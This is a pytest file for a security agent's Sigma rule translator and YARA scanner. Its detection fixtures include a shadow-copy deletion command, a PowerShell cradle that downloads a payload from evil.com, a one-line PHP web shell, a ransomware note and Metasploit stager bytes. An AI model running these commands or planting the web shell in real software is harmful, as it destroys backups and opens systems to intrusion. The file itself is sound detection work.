import pytest
from agent.rules.sigma_translator import SigmaRuleTranslator, SigmaRule
from agent.rules.yara_scanner import YaraScanner, YaraRule


def test_sigma_translator_init_and_default_rules():
    translator = SigmaRuleTranslator()
    assert len(translator.rules) >= 4
    rule_ids = [r.id for r in translator.rules]
    assert "sigma-win-ransomware-vssadmin" in rule_ids
    assert "sigma-win-mimikatz-exec" in rule_ids
    assert "sigma-lnx-ptrace-injection" in rule_ids
    assert "sigma-net-hydra-ssh-bruteforce" in rule_ids


def test_sigma_translator_ransomware_detection():
    translator = SigmaRuleTranslator()
    
    # Positive match
    event = {
        "event_type": "process_creation",
        "image": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "pid": 4120
    }
    matches = translator.evaluate(event)
    assert len(matches) >= 1
    assert matches[0]["id"] == "sigma-win-ransomware-vssadmin"
    assert matches[0]["severity"] == "critical"

    # Negative match
    benign_event = {
        "event_type": "process_creation",
        "image": "calc.exe",
        "command_line": "calc.exe",
        "pid": 5000
    }
    matches_benign = translator.evaluate(benign_event)
    assert len(matches_benign) == 0


def test_sigma_translator_hydra_ssh_detection():
    translator = SigmaRuleTranslator()
    event = {
        "event_type": "network_connection",
        "dst_port": 22,
        "comm": "hydra",
        "details": {
            "auth_status": "failure",
            "fail_count": 15
        }
    }
    matches = translator.evaluate(event)
    assert any(m["id"] == "sigma-net-hydra-ssh-bruteforce" for m in matches)



def test_sigma_custom_yaml_rule():
    yaml_content = """
id: TEST-001
title: Suspicious PowerShell Download
status: test
description: Detects powershell web download cradle
level: high
logsource:
    category: process_creation
detection:
    selection:
        image|endswith: 'powershell.exe'
        command_line|contains: 'DownloadString'
    condition: selection
"""
    translator = SigmaRuleTranslator(rules_dir=None)
    rule = translator.load_rule_from_yaml(yaml_content)
    assert rule.id == "TEST-001"
    
    # Match test
    event = {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -nop -c (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
    }
    matches = translator.evaluate(event)
    assert len(matches) == 1
    assert matches[0]["id"] == "TEST-001"


def test_yara_scanner_init_and_default_rules():
    scanner = YaraScanner()
    assert len(scanner.rules) >= 3
    rule_names = [r.name for r in scanner.rules]
    assert "Ransomware_Readme_Note" in rule_names
    assert "Generic_Webshell_PHP" in rule_names
    assert "Metasploit_Reverse_TCP_Stager" in rule_names


def test_yara_scanner_ransomware_note_detection():
    scanner = YaraScanner()
    sample_text = b"Attention! Your network has been breached and all files encrypted with AES-256. Send 2 BTC to our Bitcoin address to decrypt."
    matches = scanner.scan_bytes(sample_text)
    assert len(matches) >= 1
    assert any(m["rule"] == "Ransomware_Readme_Note" for m in matches)


def test_yara_scanner_webshell_detection():
    scanner = YaraScanner()
    php_code = b"<?php if(isset($_POST['cmd'])){ system($_POST['cmd']); } ?>"
    matches = scanner.scan_bytes(php_code)
    assert len(matches) >= 1
    assert any(m["rule"] == "Generic_Webshell_PHP" for m in matches)


def test_yara_scanner_hex_pattern_detection():
    scanner = YaraScanner()
    # Metasploit stager pattern: \xfc\xe8...\x60\x89\xe5
    stager_bytes = b"junk_prefix\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2junk_suffix"
    matches = scanner.scan_bytes(stager_bytes)
    assert len(matches) >= 1
    assert any(m["rule"] == "Metasploit_Reverse_TCP_Stager" for m in matches)


def test_yara_scanner_benign_bytes():
    scanner = YaraScanner()
    clean_bytes = b"Hello world, this is a perfectly harmless text file."
    matches = scanner.scan_bytes(clean_bytes)
    assert len(matches) == 0
